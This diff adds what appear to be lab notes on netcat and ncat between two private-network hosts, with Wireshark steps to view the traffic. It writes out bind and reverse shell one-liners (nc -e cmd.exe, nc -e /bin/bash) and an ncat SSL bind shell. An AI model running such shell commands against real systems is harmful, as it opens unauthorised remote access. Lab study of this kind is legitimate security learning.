@@ -1,0 +1,40 @@
+# Setup
+
+Linux           192.168.2.10
+Windows         192.168.2.12
+
+# Netcat chat
+Windows         nc -nlvp 4444
+Linux           nc -nv 192.168.2.12 4444
+
+# Bind shell
+Windows         nc -nlvp 4444 -e cmd.exe
+Linux           nc -nv 192.168.2.12 4444
+
+# Reverse shell
+Windows         nc -nlvp 4444
+Linux           nc -nv 192.168.2.12 4444 -e /bin/bash
+------------------------------------------------------------------------------------------------------
+
+# Ncat is part of the nmap package.
+
+Files needed for Windows 7: ncat.exe, libeay32.dll, ssleay32.dll
+
+# Bind shell
+Windows         ncat -nlvp 4444 -e cmd.exe --allow 192.168.2.10 --ssl
+Linux           ncat -nv 192.168.2.12 4444 --ssl
+-----------------------------------------------------------------------------------------------
+
+# Wireshark
+
+Capture > Interfaces > choose your interface.
+To filter out unwanted traffic choose Options.
+Create a capture filter to only listen for traffic on the Windows box on TCP port 4444.
+     host 192.168.2.12 and tcp port 4444
+     Start
+
+Now generate some traffic with netcat.
+
+Go to Wireshark and hit Stop.
+Right click on any packet > Follow TCP Stream. You should be able to see clear text.
+-----------------------------------------------------------------------------------------------
